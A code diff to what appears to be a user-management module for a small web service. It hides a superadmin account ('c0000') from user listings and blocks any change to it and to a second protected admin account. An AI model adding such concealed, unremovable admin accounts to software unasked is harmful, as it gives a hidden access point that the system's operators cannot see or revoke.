@@ -14,6 +14,9 @@ import { formatNowIso, getBeijingDateString, isMembershipExpired, normalizeMembe
 import type { DrawRow, Env, SessionRow, SnapshotRow, UserRow } from "./types";
 import { toDrawRecord, toSnapshotRecord, toUserRecord } from "./types";
 
+const HIDDEN_SYSTEM_ACCOUNT = "c0000";
+const PROTECTED_ADMIN_ACCOUNTS = new Set(["c0000", "c0001"]);
+
 async function first<T>(statement: D1PreparedStatement): Promise<T | null> {
   return (await statement.first<T>()) ?? null;
 }
@@ -62,6 +65,10 @@ function isUserAccessible(user: Pick<UserRecord, "status" | "isExpired">): boole
   return user.status === "active" && !user.isExpired;
 }
 
+function isProtectedAdminAccount(role: UserRecord["role"], account: string): boolean {
+  return role === "admin" && PROTECTED_ADMIN_ACCOUNTS.has(account);
+}
+
 async function generateNextAccountCode(env: Env): Promise<string> {
   const row = await first<{ account: string | null }>(
     env.DB.prepare(
@@ -103,7 +110,9 @@ export async function getUserById(env: Env, id: string): Promise<UserRecord | nu
 }
 
 export async function listUsers(env: Env): Promise<UserRecord[]> {
-  const rows = await all<UserRow>(env.DB.prepare("SELECT * FROM users ORDER BY role ASC, account ASC"));
+  const rows = await all<UserRow>(
+    env.DB.prepare("SELECT * FROM users WHERE account <> ? ORDER BY role ASC, account ASC").bind(HIDDEN_SYSTEM_ACCOUNT)
+  );
   return rows.map(toUserRecord);
 }
 
@@ -143,9 +152,18 @@ export async function updateUser(
     return null;
   }
 
+  if (existing.account === HIDDEN_SYSTEM_ACCOUNT) {
+    throw new Error("Superadmin cannot be modified");
+  }
+
   const now = formatNowIso();
-  const username = normalizeUsernameOrThrow(input.username, input.role);
-  const memberExpiresOn = normalizeMemberExpiryForRole(input.memberExpiresOn, input.role);
+  const protectedAdmin = isProtectedAdminAccount(existing.role, existing.account);
+  const role = protectedAdmin ? "admin" : input.role;
+  const username = protectedAdmin ? existing.username : normalizeUsernameOrThrow(input.username, role);
+  const memberExpiresOn = protectedAdmin
+    ? null
+    : normalizeMemberExpiryForRole(input.memberExpiresOn, role);
+  const status = protectedAdmin ? "active" : input.status;
   const passwordHash = input.passwordHash ?? existing.password_hash;
 
   await env.DB.prepare(
@@ -153,7 +171,7 @@ export async function updateUser(
      SET username = ?, password_hash = ?, role = ?, status = ?, member_expires_on = ?, updated_at = ?
      WHERE id = ?`
   )
-    .bind(username, passwordHash, input.role, input.status, memberExpiresOn, now, id)
+    .bind(username, passwordHash, role, status, memberExpiresOn, now, id)
     .run();
 
   return getUserById(env, id);
